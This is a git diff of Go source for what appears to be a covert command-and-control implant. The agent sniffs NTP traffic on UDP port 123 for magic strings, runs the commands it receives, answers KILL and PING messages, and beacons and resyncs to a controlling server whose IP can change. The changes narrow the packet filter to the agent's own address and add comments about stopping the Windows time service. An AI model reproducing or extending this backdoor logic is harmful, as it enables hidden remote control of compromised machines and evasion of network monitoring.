@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"mesa/goclient/pkg/agent"
+	"net"
 	"os/exec"
 	"strings"
 
@@ -21,7 +22,7 @@ func StartSniffer(newAgent agent.Agent) {
 		var (
 			iface  = newAgent.IFace
 			buffer = int32(1600)
-			filter = "udp and port 123" //note for myself: listening for any NTP traffic, magic string search
+			filter = "udp and port 123 and dst " + net.IP(newAgent.MyIP).String() //note for myself: listening for any NTP traffic, magic string search
 			//when i send ping (from server) for the first time, it should take note of my IP and call setup. store that for beacons
 			//if i ping again from a different IP, calls setup again with the new IP. fixes the ntp.fun dns issue
 		)
@@ -48,13 +49,13 @@ func StartSniffer(newAgent agent.Agent) {
 				runCommand(msg, newAgent)
 				msg = ""
 			} else if cont == "KILL" {
-				//TODO add start shutdown
+				//TODO add start shutdown. run commands whatever (for windows net stop w32time, linux??)
 				return
 			} else if cont == "PING" { //resync
 				fmt.Println(string(newAgent.ServerIP))
 				fmt.Println(ret)
 				if ret != string(newAgent.ServerIP) { //solves DHCP issue
-					newAgent.ServerIP = []byte(ret)
+					newAgent.ServerIP = []byte(ret) //TODO on normal?
 					agent.Setup(newAgent)
 				} else {
 					Heartbeat(newAgent)
